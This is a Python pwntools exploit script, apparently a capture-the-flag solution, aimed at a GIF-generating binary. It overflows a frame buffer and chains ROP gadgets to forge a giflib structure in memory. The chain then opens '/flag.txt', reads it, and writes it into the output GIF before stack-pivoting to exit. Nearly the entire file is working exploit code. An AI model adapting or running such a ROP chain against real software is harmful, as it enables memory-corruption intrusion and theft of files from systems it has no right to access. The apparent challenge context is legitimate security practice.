#!/usr/bin/python3

from pwn import *

vuln = ELF("./graas")
context.binary = vuln

FLAG_PATH = b"/flag.txt"

def find_gadget(assembly:str) -> bytes:
    """
    Automatically fetch a gadget we know exists
    """
    b = asm(assembly)
    addr = next(vuln.search(b, executable=True))
    return p64(addr)    

POP_RDI = find_gadget("pop rdi; ret")
POP_RSI = find_gadget("pop rsi; ret")
POP_RDX = find_gadget("pop rdx; ret")
POP_RBX = find_gadget("pop rbx; ret")
POP_RBP = find_gadget("pop rbp; ret")
POP_RSP = find_gadget("pop rsp; ret")
#these two gadgets together let us do write what where
MOV_RBX_48_RAX_POP_RBX = find_gadget("mov qword ptr [rbx + 0x48], rax ; pop rbx ; ret")
MOV_RAX_RBP_POP_RBX_RBP = find_gadget("mov rax, rbp ; pop rbx ; pop rbp ; ret")


GIF_FILE_SIZE = 120
GIF_FILE_OFFSET_PRIVATE = 112
GIF_FILE_PRIVATE_OFFSET_STATE = 0
GIF_FILE_PRIVATE_OFFSET_FILE = 0x40
GIF_FILE_PRIVATE_OFFSET_BUF = 0x58
CRAFTED_GIF = vuln.symbols["_end"] + 0x300 #we need space because of the upcoming stack pivot
CRAFTED_GIF_PRIVATE = CRAFTED_GIF + GIF_FILE_SIZE

payload = b""
payload += 128*128*b"A" #fill frame
#payload += 12* b"B" #padding

#craft a fake gif private structure in bss
#we place it at the address of _end, and the Private struct right after
#a GifFileType structure has size 120, pointer to private is the last field
payload += 8*b"C" #rbx
payload += p64(CRAFTED_GIF_PRIVATE) #rbp -> rax
payload += 8*b"E" #r12
payload += MOV_RAX_RBP_POP_RBX_RBP
payload += p64(CRAFTED_GIF + GIF_FILE_OFFSET_PRIVATE - 0x48) #rbx
payload += 8*b"D" #rbp
payload += MOV_RBX_48_RAX_POP_RBX
payload += 8*b"C" #rbx
#make it "writable"
payload += POP_RDX
payload += p64(1)
payload += POP_RDI
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_STATE)
payload += POP_RSI
payload += p64(next(vuln.search(b"\xc3"))) #we just need an odd number here actually
payload += p64(vuln.plt["memcpy"])

#build "/flag.txt" in bss
#we use the fact that rdx stays 1 after the memcpy
for i in range(len(FLAG_PATH)-1, -1, -1):
    payload += POP_RDI
    payload += p64(vuln.symbols["_end"] + i)
    payload += POP_RSI
    payload += p64(next(vuln.search(FLAG_PATH[i:i+1])))
    payload += p64(vuln.plt["memcpy"])

#open the flag (+fdopen) (rdi already set by the last memcpy)
payload += POP_RSI
payload += p64(0)
payload += POP_RDX
payload += p64(0)
payload += p64(vuln.plt["open"])
#fd should be 5, because 3 is input gif and 4 is output gif
payload += POP_RDI
payload += p64(5)
payload += POP_RSI
payload += p64(next(vuln.search(b"rb\0"))) #exists because called by the lib
payload += p64(vuln.plt["fdopen"])
payload += POP_RBX
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_FILE - 0x48)
payload += MOV_RBX_48_RAX_POP_RBX
payload += 8*b"F" #rbx

#read the flag -> use the gif function to read extension
payload += POP_RDI
payload += p64(CRAFTED_GIF)
payload += POP_RSI
payload += p64(vuln.symbols["_end"])
payload += p64(vuln.symbols["DGifGetExtensionNext"])

#reopen output to get a file handle to it and store it in our crafted gif
payload += POP_RDI
payload += p64(4)
payload += POP_RSI
payload += p64(next(vuln.search(b"wb\0"))) #exists because called by the lib
payload += p64(vuln.plt["fdopen"])
payload += POP_RBX
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_FILE - 0x48)
payload += MOV_RBX_48_RAX_POP_RBX
payload += 8*b"F" #rbx

#write the flag to the gif
payload += POP_RDI
payload += p64(CRAFTED_GIF)
payload += POP_RSI
payload += p64(80)
payload += POP_RDX
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_BUF)
payload += p64(vuln.symbols["EGifPutExtensionBlock"])

#fclose the file to flush, then exit
#we can stack pivot for that
#first gadget: pop the file struct
payload += POP_RBP
payload += POP_RDI #rbp -> rax
payload += MOV_RAX_RBP_POP_RBX_RBP
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_FILE - 8 - 0x48)
payload += p64(vuln.symbols["fclose"]) #rbp->rax later
payload += MOV_RBX_48_RAX_POP_RBX
payload += 8*b"H"
#build the other gadgets after the file struct
payload_bss = [POP_RDI, p64(0), p64(vuln.symbols["_exit"]), 8*b"G"]
for i in range(len(payload_bss)):
    payload += MOV_RAX_RBP_POP_RBX_RBP
    payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_FILE +(i+1)*8 -0x48)
    payload += payload_bss[i]
    payload += MOV_RBX_48_RAX_POP_RBX
    payload += 8*b"H"
#stack pivot
payload += POP_RSP
payload += p64(CRAFTED_GIF_PRIVATE + GIF_FILE_PRIVATE_OFFSET_FILE - 8)


p = process(["./gifgen", str(len(payload))])
p.send(payload)
p.recvall()
p.close()